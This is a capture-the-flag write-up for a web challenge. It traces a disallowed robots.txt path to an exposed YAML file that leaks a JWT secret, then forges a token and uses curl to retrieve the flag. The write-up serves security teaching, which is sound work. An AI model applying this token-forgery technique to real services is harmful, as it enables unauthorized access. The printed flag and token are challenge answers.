## Introduction

![](images/image.png)

Starboy, or Starboy Diary is just a simple frontend that shows a list of images for famous artists. The description though, saying "You Need more than Google just to find them" is a hint that we need to look at something related to Google, a clear hint for the `robots.txt` file.

## Analysis

The `robots.txt` file is a file that is used by search engines to know which pages to index and which pages to ignore. The `robots.txt` file is located at this [url](https://starboy-diary.vercel.app/robots.txt) and it contains the following:

```txt
User-agent: *

Disallow: /secrets/starboy_secrets.yml
```

So, we can see that there is a file called `starboy_secrets.yml` that is disallowed, We can try to access it by changing the url to this [url](https://starboy-diary.vercel.app/secrets/starboy_secrets.yml) and we get the following:

```yml
name: secrets
repository_url: https://github.com/hmlndrr/Starboy
content:
  jwt-secret: thurdsay_house_of_balloons_echos_of_silence
```

Our Artifact is the `jwt-secret` which is `thurdsay_house_of_balloons_echos_of_silence`. and a link to the repository.

If you haven't heard of JWT, you can checkout this [youtube video](https://www.youtube.com/watch?v=UBUNrFtufWo) explaining the difference between it and Seession based authentication.

Going through the repository, we can see that there is a file called `server.js` that contains the following:

```ts
import type { NextApiRequest, NextApiResponse } from "next";
import * as jwt from "jsonwebtoken";
import * as yml from "js-yaml";
import * as fs from "fs";

type Data = {
  message: string;
};

type Config = {
  name: string;
  repository_url: string;
  content: {
    [key: string]: string;
  };
};


export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {

    // get the authorization header
  const { authorization } = req.headers;

    // if there is no authorization header, return 401
  if (!authorization) {
    res.status(401).json({ message: "No authorization header" });
    return;
  }

    // split the authorization header into two parts
  const [authType, token] = authorization.split(" ");

    // if the authorization type is not Bearer, return 401
  if (authType !== "Bearer") {
    res.status(401).json({ message: "Not A Valid Bearer" });
    return;
  }

    // if there is no token, return 401
  if (!token) {
    res.status(401).json({ message: "Not A Valid Token" });
    return;
  }

  try {
    // get the secret from the yaml file we found earlier
    const url = process.env.ME || "http://localhost:3000";
    const secret = yml.load(
      await fetch(`${url}/secrets/starboy_secrets.yml`).then((res) =>
        res.text()
      )
    ) as Config;


    if (!secret) {
      res.status(500).json({ message: "Internal Error, Contact Admin" });
      return;
    }


    // verify the token
    const payload = jwt.verify(token, secret.content["jwt-secret"]);
    if (!payload) {
      res.status(401).json({ message: "Unauthorized" });
      return;
    }

    // if the payload.sub is not starboy, return 401
    if (payload.sub !== "starboy") {
      res.status(401).json({ message: "Unauthorized" });
      return;
    }

    const flag = process.env.FLAG || "No Flag, Contact Admin";

    // return the flag
    res.status(200).json({ message: flag });
  } catch (e: any) {
    console.log(e);
    res.status(500).json({ message: "An Error Just Happened, Contact Admin" });
    return;
  }
}
```

The file is located in `/src/pages/api/secrets`, which, if you are not familiar with `NextJS`, will create an HTTP endpoint at `/api/secrets` routed to the `handler` function.

## Solving

So, we can see that the server is using JWT to authenticate the user, and the secret is stored in the `starboy_secrets.yml` file. We can use the [jwt.io](https://jwt.io/) website to generate a JWT token with the following payload, and the secret that we have found earlier:

```json
{
  "sub": "starboy"
}
```

![](images/jwt.io.png)

we get the following token:

```txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdGFyYm95In0.z6Ud8nHjn0QYybwHWuiiA7NCCxc4aOBr3bwQmMGjoQk
```

We can then use the `curl` command to send a request to the server with the token in the `Authorization` header (or you can use any other tool like Postman, Thunder Client, Burp Suite, etc.):

```bash
curl -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdGFyYm95In0.z6Ud8nHjn0QYybwHWuiiA7NCCxc4aOBr3bwQmMGjoQk' https://starboy-diary.vercel.app/api/secrets

# {"message":"ENIT{L1ke_a_m0th_2_a_fl4mE}"}
```

## Conclusion

In this challenge, we learned about the `robots.txt` file and how it can be used to find hidden files, and we also learned about JWT and how it can be used to authentication.

## Flag
> ENIT{L1ke_a_m0th_2_a_fl4mE}